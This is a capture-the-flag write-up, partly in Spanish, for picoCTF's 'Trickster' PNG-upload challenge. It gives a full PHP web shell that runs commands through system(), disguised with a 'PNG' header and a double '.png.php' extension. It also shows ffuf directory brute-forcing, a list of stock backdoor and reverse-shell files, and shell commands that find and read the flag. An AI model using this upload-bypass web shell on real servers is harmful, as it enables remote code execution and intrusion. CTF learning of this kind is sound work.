

I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance
## Solucion

google> php web shell
https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985



```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

- le agregamos PNG al inicio
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>

```

## otra fuente para wl webshell

```
locate webshells/php
/usr/share/webshells/php
/usr/share/webshells/php/findsocket
/usr/share/webshells/php/php-backdoor.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/qsd-php-backdoor.php
/usr/share/webshells/php/simple-backdoor.php
/usr/share/webshells/php/findsocket/findsock.c
/usr/share/webshells/php/findsocket/php-findsock-shell.php

cp /usr/share/webshells/php/simple-backdoor.php webshell.php

mv webshell.php webshell.png.php

http://atlas.picoctf.net:55599/uploads/webshell.png.php?cmd=ls

find / -name *txt

cat /var/www/html/G4ZTCOJYMJSDS.txt

```


- Intentamos subirlo, solo acepta pngs, le agregamos doble extensión
```
mv webshell.php webshell.png.php

```

- Ahora hay que encontrar donde se subio, escaneamos directorios
```
sudo apt install wordlists
sudo apt ffuf

 http://atlas.picoctf.net:54794/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://atlas.picoctf.net:54794/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 321, Words: 53, Lines: 17, Duration: 102ms]
uploads                 [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 102ms]>)
```

```
PNG

/usr/lib/python3.9/LICENSE.txt
/usr/local/lib/php/.channels/.alias/pear.txt
/usr/local/lib/php/.channels/.alias/pecl.txt
/usr/local/lib/php/.channels/.alias/phpdocs.txt
/usr/local/lib/php/doc/Archive_Tar/docs/Archive_Tar.txt
/usr/share/perl/5.32.1/Unicode/Collate/allkeys.txt
/usr/share/perl/5.32.1/Unicode/Collate/keys.txt
/usr/share/perl/5.32.1/unicore/Blocks.txt
/usr/share/perl/5.32.1/unicore/NamedSequences.txt
/usr/share/perl/5.32.1/unicore/SpecialCasing.txt
/var/www/html/G4ZTCOJYMJSDS.txt
/var/www/html/instructions.txt
/var/www/html/robots.txt

```

```
cat /var/www/html/G4ZTCOJYMJSDS.txt
PNG

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9} */


```




[https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)